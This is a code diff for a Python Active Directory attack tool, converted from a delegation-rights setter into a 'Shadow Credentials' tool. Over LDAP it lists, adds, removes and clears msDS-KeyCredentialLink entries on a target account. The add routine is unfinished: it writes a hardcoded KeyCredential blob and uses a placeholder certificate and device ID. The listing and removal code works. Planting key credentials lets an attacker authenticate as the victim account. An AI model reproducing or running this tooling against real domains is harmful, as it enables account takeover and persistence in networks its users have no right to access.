@@ -6,7 +6,8 @@
 #  Remi Gascou (@podalirius_)
 #  Charlie Bromberg (@_nwodtuhs)
 #
-
+import random
+import string
 from binascii import unhexlify
 from enum import Enum
 from impacket.examples import logger, utils
@@ -171,13 +172,13 @@ def ConvertFromBinaryTime(binaryTime:bytes, source:KeySource, version:KeyCredent
         if source == KeySource.AD.value:
             return datetime.datetime(1601, 1, 1, 0, 0, 0) + datetime.timedelta(seconds=timeStamp/1e7)
         else:
-            print("This is not fully supported right now, you may encounter issues. Please contact us @podalirius_ @_nwodtuhs")
+            logger.error("This is not fully supported right now, you may encounter issues. Please contact us @podalirius_ @_nwodtuhs")
             return datetime.datetime(1601, 1, 1, 0, 0, 0) + datetime.timedelta(seconds=timeStamp/1e7)
     else:
         if source == KeySource.AD.value:
             return  datetime.datetime(1601, 1, 1, 0, 0, 0) + datetime.timedelta(seconds=timeStamp/1e7)
         else:
-            print("This is not fully supported right now, you may encounter issues. Please contact us @podalirius_ @_nwodtuhs")
+            logger.error("This is not fully supported right now, you may encounter issues. Please contact us @podalirius_ @_nwodtuhs")
             return datetime.datetime(1601, 1, 1, 0, 0, 0) + datetime.timedelta(seconds=timeStamp/1e7)
 
 class DN_binary_KeyCredentialLink():
@@ -186,7 +187,7 @@ class DN_binary_KeyCredentialLink():
         self.structure = {}
         self.version   = KeyCredentialVersion.Version0
 
-        ## Spliting input data
+        ## Splitting input data
         data = raw_data.decode('UTF-8').split(":")
         # type = data[0]
         # length = int(data[1])
@@ -212,7 +213,6 @@ class DN_binary_KeyCredentialLink():
         ## Parsing data
         self.parsed_data = {"version": self.version}
         for row in data:
-            # print(row)
             if row["entryType"] == KeyCredentialEntryType.KeyID.value:
                 self.parsed_data['KeyID'] = ConvertToBinaryIdentifier(row["value"], self.version)
             elif row["entryType"] == KeyCredentialEntryType.KeyHash.value:
@@ -347,8 +347,7 @@ def ldap3_kerberos_login(connection, target, user, password, domain='', lmhash='
     userName = Principal(user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
     if TGT is None:
         if TGS is None:
-            tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, password, domain, lmhash, nthash,
-                                                                    aesKey, kdcHost)
+            tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, password, domain, lmhash, nthash, aesKey, kdcHost)
     else:
         tgt = TGT['KDC_REP']
         cipher = TGT['cipher']
@@ -356,8 +355,7 @@ def ldap3_kerberos_login(connection, target, user, password, domain='', lmhash='
 
     if TGS is None:
         serverName = Principal('ldap/%s' % target, type=constants.PrincipalNameType.NT_SRV_INST.value)
-        tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(serverName, domain, kdcHost, tgt, cipher,
-                                                                sessionKey)
+        tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(serverName, domain, kdcHost, tgt, cipher, sessionKey)
     else:
         tgs = TGS['KDC_REP']
         cipher = TGS['cipher']
@@ -438,7 +436,7 @@ class ShadowCredentials(object):
         self.domain_dumper = ldapdomaindump.domainDumper(self.ldap_server, self.ldap_session, cnf)
 
 
-    def read(self):
+    def list(self):
         logging.info("Searching for the target account")
         result = self.get_dn_sid_from_samname(self.target_samname)
         if not result:
@@ -446,7 +444,6 @@ class ShadowCredentials(object):
             return
         else:
             logging.info("Target user found: %s" % result[0])
-        logging.info("Listing devices for %s" % self.target_samname)
         self.ldap_session.search(result[0], '(objectClass=*)', search_scope=ldap3.BASE, attributes=['SAMAccountName', 'objectSid', 'msDS-KeyCredentialLink'])
         results = None
         for entry in self.ldap_session.response:
@@ -457,128 +454,148 @@ class ShadowCredentials(object):
             logging.error('Could not query target user properties')
             return
         try:
-            for dn_binary_value in results['raw_attributes']['msDS-KeyCredentialLink']:
-                keycredentiallink = DN_binary_KeyCredentialLink(dn_binary_value)
-                logging.info("DeviceID: %s | Creation Time (UTC): %s" % (keycredentiallink.parsed_data["DeviceId"], keycredentiallink.parsed_data["KeyCreationTime"]))
-                for key in keycredentiallink.parsed_data.keys():
-                    logging.debug("%s: %s" % (key, keycredentiallink.parsed_data[key]))
+            if len(results['raw_attributes']['msDS-KeyCredentialLink']) == 0:
+                logging.info('Attribute msDS-KeyCredentialLink is empty')
+            else:
+                logging.info("Listing devices for %s" % self.target_samname)
+                for dn_binary_value in results['raw_attributes']['msDS-KeyCredentialLink']:
+                    keycredentiallink = DN_binary_KeyCredentialLink(dn_binary_value)
+                    logging.info("DeviceID: %s | Creation Time (UTC): %s" % (keycredentiallink.parsed_data["DeviceId"], keycredentiallink.parsed_data["KeyCreationTime"]))
+                    for key in keycredentiallink.parsed_data.keys():
+                        logging.debug("%s: %s" % (key, keycredentiallink.parsed_data[key]))
         except IndexError:
-            logging.info('Attribute msDS-KeyCredentialLink is empty')
+            logging.info('Attribute msDS-KeyCredentialLink does not exist')
         return
 
-
-    def write(self, delegate_from):
-        self.delegate_from = delegate_from
-
-        # Get escalate user sid
-        result = self.get_dn_sid_from_samname(self.delegate_from)
+    def add(self, password, path):
+        logging.info("No path was provided. The certificate will be printed as a Base64 blob")
+        if password is None:
+            password = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(20))
+            logging.info("No pass was provided. The certificate will be store with the password: %s" % password)
+        if path is None:
+            pass
+        logging.info("Searching for the target account")
+        result = self.get_dn_sid_from_samname(self.target_samname)
         if not result:
-            logging.error('User to escalate does not exist!')
+            logging.error('Target account does not exist! (wrong domain?)')
             return
-        self.SID_delegate_from = str(result[1])
-
-        # Get target computer DN
-        result = self.get_dn_sid_from_samname(self.delegate_to)
-        if not result:
-            logging.error('Computer to modify does not exist! (wrong domain?)')
+        else:
+            logging.info("Target user found: %s" % result[0])
+        logging.info("Generating certificate")
+        cert = "blahblah"
+        logging.info("Certificate generated")
+        logging.info("Generating KeyCredential")
+        kc = b'B:828:000200002000010931771AA15D0D2C55F90085364F9105A8FF8EF5F7D29EAFB68D25FE9327BAA42000029B7190E48CCBF5985D4C9775B1CFB56BE4153CA99CE4DEE6AC4943EEEC5A86DD1B0103525341310008000003000000000100000000000000000000010001BC8830BAB8E09BF812656E00FA7EEB4D83CF710EB072C4F19F540537CD51756720537BFD157238E92567B68D68AD548758324FBA1FDEE0AA08D3ED9963D03EF9BB4BB8CB9158D7AA767F6BCF52912BDD7FA5C4D3EDBAB481885DC9F0F46C1AF79554128C103869DAFA0847229F59543A2F8AEAF538F30C5634C1B6C87F9F8CCD2E79241503C7754D23E66DA6BAF97CBD3BD4B7964D5FB7EAFEA70B8BB1AF9DB77319F6F9CF0EEBE16AF878A1038BF75CBC73B2E20D4A9F48D64236921D997924DD59E8951F9F6B3A813CEF78D8D386CD9FE1704E0A44F88F5E90265C07F0733143E173CBD4165E890F3B8AC533BF0A8BEBE66560BDB996C408472A33C9E2F87101000401010005001000061D1CC264E8B1894CB93691CFB32548CF0200070100080008ECFFF45A0F7FD701080009ECFFF45A0F7FD701:CN=user2,CN=Users,DC=domain,DC=local'
+        logging.info("KeyCredential generated with DevideID: %s" % "BLAHBLAHBLAH <3")
+        self.ldap_session.search(result[0], '(objectClass=*)', search_scope=ldap3.BASE, attributes=['SAMAccountName', 'objectSid', 'msDS-KeyCredentialLink'])
+        results = None
+        for entry in self.ldap_session.response:
+            if entry['type'] != 'searchResEntry':
+                continue
+            results = entry
+        if not results:
+            logging.error('Could not query target user properties')
             return
-        self.target_samname = result[0]
-
-        # Get list of allowed to act and build security descriptor including previous data
-        sd, targetuser = self.get_keycredentiallink()
-
-        # writing only if SID not already in list
-        if self.SID_delegate_from not in [ ace['Ace']['Sid'].formatCanonical() for ace in sd['Dacl'].aces ]:
-            sd['Dacl'].aces.append(create_allow_ace(self.SID_delegate_from))
-            self.ldap_session.modify(targetuser['dn'],
-                                     {'msDS-AllowedToActOnBehalfOfOtherIdentity': [ldap3.MODIFY_REPLACE,
-                                                                                   [sd.getData()]]})
+        try:
+            new_values = results['raw_attributes']['msDS-KeyCredentialLink'] + [kc]
+            logging.info("Updating the msDS-KeyCredentialLink attribute of %s" % self.target_samname)
+            self.ldap_session.modify(result[0], {'msDS-KeyCredentialLink': [ldap3.MODIFY_REPLACE, new_values]})
             if self.ldap_session.result['result'] == 0:
-                logging.info('Delegation rights modified successfully!')
-                logging.info('%s can now impersonate users on %s via S4U2Proxy', self.delegate_from, self.delegate_to)
+                logging.info("Updated the msDS-KeyCredentialLink attribute of the target object")
+                # todo : print the cert in a Rubeus/getTGT synthax, or: save it to a file, confirm it's saved, show Rubeus/getTGT synthax
             else:
                 if self.ldap_session.result['result'] == 50:
-                    logging.error('Could not modify object, the server reports insufficient rights: %s',
-                                  self.ldap_session.result['message'])
+                    logging.error('Could not modify object, the server reports insufficient rights: %s', self.ldap_session.result['message'])
                 elif self.ldap_session.result['result'] == 19:
-                    logging.error('Could not modify object, the server reports a constrained violation: %s',
-                                  self.ldap_session.result['message'])
+                    logging.error('Could not modify object, the server reports a constrained violation: %s', self.ldap_session.result['message'])
                 else:
                     logging.error('The server returned an error: %s', self.ldap_session.result['message'])
-        else:
-            logging.info('%s can already impersonate users on %s via S4U2Proxy', self.delegate_from, self.delegate_to)
-            logging.info('Not modifying the delegation rights.')
-        # Get list of allowed to act
-        self.get_keycredentiallink()
+        except IndexError:
+            logging.info('Attribute msDS-KeyCredentialLink does not exist')
         return
 
 
-    def remove(self, delegate_from):
-        self.delegate_from = delegate_from
-
-        # Get escalate user sid
-        result = self.get_dn_sid_from_samname(self.delegate_from)
+    def remove(self, device_id):
+        logging.info("Searching for the target account")
+        result = self.get_dn_sid_from_samname(self.target_samname)
         if not result:
-            logging.error('User to escalate does not exist!')
+            logging.error('Target account does not exist! (wrong domain?)')
             return
-        self.SID_delegate_from = str(result[1])
-
-        # Get target computer DN
-        result = self.get_dn_sid_from_samname(self.delegate_to)
-        if not result:
-            logging.error('Computer to modify does not exist! (wrong domain?)')
-            return
-        self.target_samname = result[0]
-
-        # Get list of allowed to act and build security descriptor including that data
-        sd, targetuser = self.get_keycredentiallink()
-
-        # Remove the entries where SID match the given -delegate-from
-        sd['Dacl'].aces = [ace for ace in sd['Dacl'].aces if self.SID_delegate_from != ace['Ace']['Sid'].formatCanonical()]
-        self.ldap_session.modify(targetuser['dn'],
-                                 {'msDS-AllowedToActOnBehalfOfOtherIdentity': [ldap3.MODIFY_REPLACE, [sd.getData()]]})
-
-        if self.ldap_session.result['result'] == 0:
-            logging.info('Delegation rights modified successfully!')
         else:
-            if self.ldap_session.result['result'] == 50:
-                logging.error('Could not modify object, the server reports insufficient rights: %s',
-                              self.ldap_session.result['message'])
-            elif self.ldap_session.result['result'] == 19:
-                logging.error('Could not modify object, the server reports a constrained violation: %s',
-                              self.ldap_session.result['message'])
+            logging.info("Target user found: %s" % result[0])
+        self.ldap_session.search(result[0], '(objectClass=*)', search_scope=ldap3.BASE, attributes=['SAMAccountName', 'objectSid', 'msDS-KeyCredentialLink'])
+        results = None
+        for entry in self.ldap_session.response:
+            if entry['type'] != 'searchResEntry':
+                continue
+            results = entry
+        if not results:
+            logging.error('Could not query target user properties')
+            return
+        try:
+            new_values = []
+            device_id_in_current_values = False
+            for dn_binary_value in results['raw_attributes']['msDS-KeyCredentialLink']:
+                keycredentiallink = DN_binary_KeyCredentialLink(dn_binary_value)
+                if keycredentiallink.parsed_data["DeviceId"] == device_id:
+                    logging.info("Found value to remove")
+                    device_id_in_current_values = True
+                else:
+                    new_values.append(dn_binary_value)
+            if device_id_in_current_values == True:
+                logging.info("Updating the msDS-KeyCredentialLink attribute of %s" % self.target_samname)
+                self.ldap_session.modify(result[0], {'msDS-KeyCredentialLink': [ldap3.MODIFY_REPLACE, new_values]})
+                if self.ldap_session.result['result'] == 0:
+                    logging.info("Updated the msDS-KeyCredentialLink attribute of the target object")
+                else:
+                    if self.ldap_session.result['result'] == 50:
+                        logging.error('Could not modify object, the server reports insufficient rights: %s', self.ldap_session.result['message'])
+                    elif self.ldap_session.result['result'] == 19:
+                        logging.error('Could not modify object, the server reports a constrained violation: %s', self.ldap_session.result['message'])
+                    else:
+                        logging.error('The server returned an error: %s', self.ldap_session.result['message'])
             else:
-                logging.error('The server returned an error: %s', self.ldap_session.result['message'])
-        # Get list of allowed to act
-        self.get_keycredentiallink()
+                logging.error("No value with the provided DeviceID was found for the target object")
+        except IndexError:
+            logging.info('Attribute msDS-KeyCredentialLink does not exist')
         return
 
 
-    def flush(self):
-        # Get target computer DN
-        result = self.get_dn_sid_from_samname(self.delegate_to)
+    def clear(self):
+        logging.info("Searching for the target account")
+        result = self.get_dn_sid_from_samname(self.target_samname)
         if not result:
-            logging.error('Computer to modify does not exist! (wrong domain?)')
+            logging.error('Target account does not exist! (wrong domain?)')
             return
-        self.target_samname = result[0]
-
-        # Get list of allowed to act
-        sd, targetuser = self.get_keycredentiallink()
-
-        self.ldap_session.modify(targetuser['dn'], {'msDS-AllowedToActOnBehalfOfOtherIdentity': [ldap3.MODIFY_REPLACE, []]})
-        if self.ldap_session.result['result'] == 0:
-            logging.info('Delegation rights flushed successfully!')
         else:
-            if self.ldap_session.result['result'] == 50:
-                logging.error('Could not modify object, the server reports insufficient rights: %s',
-                              self.ldap_session.result['message'])
-            elif self.ldap_session.result['result'] == 19:
-                logging.error('Could not modify object, the server reports a constrained violation: %s',
-                              self.ldap_session.result['message'])
+            logging.info("Target user found: %s" % result[0])
+        self.ldap_session.search(result[0], '(objectClass=*)', search_scope=ldap3.BASE, attributes=['SAMAccountName', 'objectSid', 'msDS-KeyCredentialLink'])
+        results = None
+        for entry in self.ldap_session.response:
+            if entry['type'] != 'searchResEntry':
+                continue
+            results = entry
+        if not results:
+            logging.error('Could not query target user properties')
+            return
+        try:
+            if len(results['raw_attributes']['msDS-KeyCredentialLink']) == 0:
+                logging.info('Attribute msDS-KeyCredentialLink is empty')
             else:
-                logging.error('The server returned an error: %s', self.ldap_session.result['message'])
-        # Get list of allowed to act
-        self.get_keycredentiallink()
+                logging.info("Clearing the msDS-KeyCredentialLink attribute of %s" % self.target_samname)
+                self.ldap_session.modify(result[0], {'msDS-KeyCredentialLink': [ldap3.MODIFY_REPLACE, []]})
+                if self.ldap_session.result['result'] == 0:
+                    logging.info('msDS-KeyCredentialLink cleared successfully!')
+                else:
+                    if self.ldap_session.result['result'] == 50:
+                        logging.error('Could not modify object, the server reports insufficient rights: %s', self.ldap_session.result['message'])
+                    elif self.ldap_session.result['result'] == 19:
+                        logging.error('Could not modify object, the server reports a constrained violation: %s', self.ldap_session.result['message'])
+                    else:
+                        logging.error('The server returned an error: %s', self.ldap_session.result['message'])
+                return
+        except IndexError:
+            logging.info('Attribute msDS-KeyCredentialLink does not exist')
         return
 
 
@@ -603,10 +620,10 @@ class ShadowCredentials(object):
             return False
 
 def parse_args():
-    parser = argparse.ArgumentParser(add_help=True, description='Python (re)setter for property msDS-KeyCredentialLink for Kerberos RBCD attacks.')
+    parser = argparse.ArgumentParser(add_help=True, description='Python (re)setter for property msDS-KeyCredentialLink for Shadow Credentials attacks.')
     parser.add_argument('identity', action='store', help='domain.local/username[:password]')
     parser.add_argument("-target", type=str, required=True, dest="target_samname", help="Target account")
-    parser.add_argument('-action', choices=['read', 'write', 'remove', 'flush'], nargs='?', default='read', help='Action to operate on msDS-KeyCredentialLink')
+    parser.add_argument('-action', choices=['list', 'add', 'remove', 'clear'], nargs='?', default='list', help='Action to operate on msDS-KeyCredentialLink')
     parser.add_argument('-use-ldaps', action='store_true', help='Use LDAPS instead of LDAP')
     parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
     parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
@@ -620,11 +637,23 @@ def parse_args():
 
     group.add_argument('-dc-ip', action='store', metavar="ip address", help='IP Address of the domain controller or KDC (Key Distribution Center) for Kerberos. If omitted it will use the domain part (FQDN) specified in the identity parameter')
 
+    add = parser.add_argument_group('arguments when setting -action to add')
+    add.add_argument('-password', action='store', help='password for the stored self-signed certificate (will be random if not set)')
+    add.add_argument('-path', action='store', help='path to store the generated self-signed certificate (will be printed in base64 if not set)')
+
+    remove = parser.add_argument_group('arguments when setting -action to remove')
+    remove.add_argument('-device-id', action='store', help='device ID of the KeyCredentialLink to remove when setting -action to remove')
+
     if len(sys.argv) == 1:
         parser.print_help()
         sys.exit(1)
 
-    return parser.parse_args()
+    args = parser.parse_args()
+
+    if args.action == "remove" and args.device_id is None:
+        parser.error("the following arguments are required when setting -action to remove: -device-id")
+
+    return args
 
 
 def parse_identity(args):
@@ -717,22 +746,17 @@ def main():
     if len(nthash) > 0 and lmhash == "":
         lmhash = "aad3b435b51404eeaad3b435b51404ee"
 
-    # if args.delegate_from and args.delegate_from[-1] != "$":
-    #     args.delegate_from += "$"
-    # if args.delegate_to[-1] != "$":
-    #     args.delegate_to += "$"
-
     try:
         ldap_server, ldap_session = init_ldap_session(args, domain, username, password, lmhash, nthash)
         shadowcreds = ShadowCredentials(ldap_server, ldap_session, args.target_samname)
-        if args.action == 'read':
-            shadowcreds.read()
-        elif args.action == 'write':
-            shadowcreds.write(args.delegate_from)
+        if args.action == 'list':
+            shadowcreds.list()
+        elif args.action == 'add':
+            shadowcreds.add(args.password, args.path)
         elif args.action == 'remove':
-            shadowcreds.remove(args.delegate_from)
-        elif args.action == 'flush':
-            shadowcreds.flush()
+            shadowcreds.remove(args.device_id)
+        elif args.action == 'clear':
+            shadowcreds.clear()
     except Exception as e:
         if logging.getLogger().level == logging.DEBUG:
             traceback.print_exc()
